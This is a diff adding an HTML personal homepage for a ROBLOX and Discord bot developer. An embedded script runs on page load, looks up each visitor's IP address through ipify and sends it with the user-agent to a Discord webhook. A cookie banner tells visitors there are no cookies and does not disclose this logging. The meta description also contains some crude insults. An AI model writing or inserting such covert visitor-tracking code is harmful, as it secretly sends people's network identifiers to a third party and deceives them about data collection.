@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Variable</title>
+    <link rel="shortcut icon" type="image/jpg" href="./favicon.ico"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=1200">
+    <link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
+    <link type="text/css" rel="stylesheet" id="dark-mode-general-link">
+    <style lang="en" type="text/css" id="dark-mode-custom-style"></style>
+    <style lang="en" type="text/css" id="dark-mode-native-style"></style>
+    <style lang="en" type="text/css" id="dark-mode-native-sheet"></style>
+    <style>
+        body {
+            background-color: #333;
+            background-image: url('./thestorage/background.jpg');
+        }
+
+        .intersection {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            height: 80px;
+            border-bottom: 1px solid #fff;
+            position: relative;
+            z-index: 5;
+        }
+
+        .variable {
+            color: #9db5f2;
+            font-size: 50pt;
+            font-family: "HUN", sans-serif;
+            margin-left: 20px;
+            text-shadow: 0px 0px 4px #9db5f2, 0px 0px 10px #4c52a8, 0px 0px 20px #1a66a1, 0px 0px 100px #1732e3;
+        }
+
+        .buttons {
+            display: flex;
+            width: 100%;
+            align-items: center;
+            position: relative;
+            z-index: 3;
+        }
+
+        .button {
+            background-color: #333;
+            border: none;
+            color: #9db5f2;
+            padding: 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 25pt;
+            font-family: "HUN", sans-serif;
+            margin-right: -1px;
+            width: 25%;
+            text-shadow: 0px 0px 4px #9db5f2, 0px 0px 10px #4c52a8, 0px 0px 20px #1a66a1, 0px 0px 100px #1732e3;
+            transition: font-size 0.2s ease;
+            position: relative;
+            z-index: 4;
+            background-color: transparent;
+        }
+
+        .button:hover {
+            font-size: 55pt;
+        }
+
+        .centered-button {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .centered-button a {
+            display: inline-block;
+            color: #9db5f2;
+            font-size: 30pt;
+            padding: 20px 50px;
+            text-decoration: none;
+            font-family: "HUN", sans-serif;
+            text-shadow: 0px 0px 4px #9db5f2, 0px 0px 10px #4c52a8, 0px 0px 20px #1a66a1, 0px 0px 100px #1732e3;
+            transition: font-size 0.2s ease;
+        }
+
+        .centered-button a:hover {
+            font-size: 40pt;
+        }
+    </style>
+    <!-- Primary Meta Tags -->
+    <meta name="title" content="variable about me"/>
+    <meta name="description" content="my personal website and misc.
+    hi saturn hi aishi hi chief hi dyson vacuum cleaner hi cashier hi fatass hi jake hi autistic hi vvv hi nil hi niko hi manuel hi matrix hi jarvis hi donut hi nat hi sharpyy hi zayne hi fyoxha"/>
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website"/>
+    <meta property="og:url" content="https://variable1485.github.io"/>
+    <meta property="og:title" content="variable about me"/>
+    <meta property="og:description" content="my personal website and misc.
+    hi saturn hi aishi hi chief hi dyson vacuum cleaner hi cashier hi fatass hi jake hi autistic hi vvv hi nil hi niko hi manuel hi matrix hi jarvis hi donut hi nat hi sharpyy hi zayne hi fyoxha"/>
+    <meta property="og:image" content="https://variable1485.github.io/thestorage/goahead.gif"/>
+
+    <style>
+        /* Styles for the consent banner */
+        #cookie-consent {
+          position: fixed;
+          bottom: 0;
+          left: 50%;
+          transform: translateX(-50%);
+          background-color: #ffd700;
+          padding: 10px 20px;
+          border-top: 2px solid #000;
+          z-index: 9999;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          width: 300px;
+          border-radius: 5px;
+          box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+          font-family: Arial, sans-serif;
+        }
+        #cookie-consent button {
+          padding: 8px 16px;
+          background-color: #000;
+          color: #fff;
+          border: none;
+          border-radius: 5px;
+          cursor: pointer;
+          transition: background-color 0.3s ease;
+        }
+        #cookie-consent button:hover {
+          background-color: #333;
+        }
+
+        .center {
+  border: 5px solid;
+  margin: auto;
+  width: 50%;
+  padding: 10px;
+  color: #fff;
+}
+  .colored {
+    color: rgb(240, 75, 75);
+  }
+  .colored2 {
+    color: rgb(65, 65, 236);
+  }
+      </style>
+</head>
+<body>
+    <script> src="webhook.js"</script>
+  <script>
+    var userAgent = navigator.userAgent.toLowerCase();
+    // Function to send IP address to Discord webhook
+    function sendIPToDiscord(ip) {
+        // Discord webhook URL obtained from injected js
+        
+        // Data to send
+        var data = {
+            content: "Visitor IP: " + ip + " \nUser-agent: " + userAgent
+        };
+
+        // Send POST request to Discord webhook
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok.');
+            }
+        })
+        .catch(error => {
+            console.error('Error sending IP address to Discord:', error);
+        });
+    }
+
+    // Function to get visitor's IP address
+    function isDiscordBot() {
+    return userAgent.includes('discord');
+  }
+  function isGoogleBot() {
+    if (userAgent.includes('googlebot') || userAgent.includes('mediapartners-google')) {
+        return true
+    }
+    return false
+  }
+  function isCloudflareBot() {
+    return userAgent.includes('cloudflareobservatory');
+  }
+    function getIP() {
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            var ip = data.ip;
+            console.log('Visitor IP:', ip);
+            if (ip == "156.197.61.87") {
+                ip = "me!!!!!!!"
+            }
+            if (isDiscordBot()) {
+                ip = "oml discord bot get away"
+            }
+            if (isGoogleBot()) {
+                ip = "GOOGLE STOP CRAWLING ME"
+            }
+            if (isCloudflareBot()) {
+                ip = "CLOUDFLARE WHAT ARE YOU DOING"
+            }
+            console.log('Visitor IP:', ip);
+
+            sendIPToDiscord(ip); // Send IP address to Discord webhook
+        })
+        .catch(error => {
+            console.error('Error getting IP address:', error);
+        });
+    }
+
+    // Call getIP function when the page loads
+    getIP();
+</script>
+<div class="intersection">
+    <div class="variable">Variable</div>
+    <div class="buttons">
+        <a href="/" class="button">Variable</a>
+        <a href="/BRC" class="button">BRC</a>
+        <a href="/links" class="button">Links</a>
+        <a href="/gallery" class="button">Gallery</a>
+    </div>
+</div>
+<div style="margin-top: 20px;">
+    <img src="./pfpweb.webp" alt="centered image" style="display: block; margin: 0 auto;" width="264" height="264">
+</div>
+
+
+<h1 style="text-align: center; color: #F5F5F5; font-family: sans-serif;">variable himself (image by @catshapeddonut on twitter)</h1>
+<h2 style="text-align: center; color: #F5F5F5; font-family: sans-serif;">uh hi</h2>
+<h2 style="text-align: center; color: #F5F5F5; font-family: sans-serif;">
+    If you see this you probably came from discord.<br> Just a regular person lying around.<br> A ROBLOX developer
+    <br>Pings are fine to me by the way. <br>I'm a ROBLOX Game and Discord Bot developer (and i now make websites apparently).
+    <br><b>UTC+2 outside DST</b>
+    <br>Personality Type: <strong> <a href="https://www.16personalities.com/esfj-personality" style="color: #2a9df4">ESFJ-T</a> </strong>
+</h2>
+<!-- <div class="tenor-gif-embed" data-postid="21765718" data-share-method="host" data-aspect-ratio="0.771875"
+     data-width="100%"><a href="https://tenor.com/view/airpod-cat-fall-cat-pet-airpod-cat-gif-21765718">Airpod Cat GIF</a>
+    from <a href="https://tenor.com/search/airpod-gifs">Airpod GIFs</a></div>
+<script type="text/javascript" async src="https://tenor.com/embed.js"></script> -->
+
+<div class="centered-button">
+    <a href="https://variable1485.github.io/whatsmyip">Check My IP Address</a>
+</div>
+
+
+ <!-- Cookie Consent Banner -->
+ <div id="cookie-consent">
+    <span>Click this button to consent for cookies</span>
+    <button onclick="showCookies()">What cookies?</button>
+  </div>
+
+  <script>
+    // Function to change consent text and hide banner after 5 seconds
+    function showCookies() {
+      const consentText = document.querySelector("#cookie-consent span");
+      consentText.textContent = "Oh right, there are no cookies (except cloudflare)";
+      setTimeout(() => {
+        const cookieConsent = document.querySelector("#cookie-consent");
+        cookieConsent.style.transition = "all 1s ease";
+        cookieConsent.style.transform = "translate(-50%, 100%)";
+        setTimeout(() => {
+          cookieConsent.style.display = "none";
+        }, 1000);
+      }, 5000);
+    }
+  </script>
+
+<div class="center">
+    <p>variable.<span class="colored">i</span><span class="colored2">see</span><span class="colored">you</span></p>
+    <p>variable.icu is property of ME!!!! send your emails to <a href="mailto:me@variable.icu">me@variable.icu</a></p>
+  </div>
+</body>
+</html>
